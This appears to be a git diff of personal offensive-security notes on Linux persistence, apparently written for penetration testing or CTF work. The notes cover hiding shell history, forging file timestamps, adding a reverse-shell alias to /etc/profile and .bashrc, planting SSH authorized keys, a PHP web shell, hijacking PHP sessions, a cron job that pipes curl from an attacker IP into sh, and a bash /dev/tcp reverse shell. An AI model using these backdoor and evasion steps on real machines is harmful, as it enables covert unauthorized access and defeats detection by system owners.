@@ -2,10 +2,6 @@
 
 For general overview of persistance that OS neutral: [[Persistence]].
 
-## Stealth 
-```bash
-unset HISTFILE         # disable writing to history file
-```
 
 #### Ippsec Timestamp checking
 
@@ -16,11 +12,17 @@ find / -type f -printf "%T+ %p\n" | grep -v 00000000
 touch original_lib_file -r persistence_file
 ```
 
+#### .rc Aliasign
 
-## Backdoors required?
-Reference:[airman604](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c)
+```bash
+# If have sudo or permission to propagate to all users
+echo "alias PEST='($revershell_goes_here)'" | sudo tee -a /etc/profile
+# consider .zshrc or dash.rc
+echo "alias PEST='($revershell_goes_here)'" | sudo tee -a /home/$USER/.bashrc 
+```
 
-## ssh keys
+
+#### SSH Keys
 It's not very hidden, easy to remove or detect. - https://attack.mitre.org/techniques/T1098/
 ```bash
 # Generate on host; provide some fields
@@ -29,12 +31,10 @@ ssh-keygen
 # cat public key on host and echo it into .ssh/authorized_keys
 mkdir .ssh
 echo "ssh-rsa $base64fromkey" > .ssh/authorized_keys
-```
-# 
 chmod 600 id_rsa
 ```
 
-## php
+#### php
 web root /var/www/html
 `touch shell.php` and add the below:
 Or add within a file of this directory
@@ -47,7 +47,7 @@ Change the 'cmd' paramtre to something that LESS like to be called
 ?>
 ```
 
-## stealing php session
+#### stealing php session
 ```bash
 /var/lib/php/sessions # defauilt locations
 sess_<SESSION_ID> # set your PHPSESSID cookie to hijack
@@ -58,14 +58,11 @@ session.save_path
 session.name
 ```
 
-## cronjob
+#### Cron
 ```bash
-CT=$(crontab -l)
-CT=$CT$'\n* *     * * *   root    curl http://<ip>:<port>/run | sh'
-printtf "$CT | cronbtab -
 ```
+
 Serve shell script, for example:
-file
 ```bash
 #!/bin/bash
 bash -i >& /dev/tcp/ip/port 0>&1
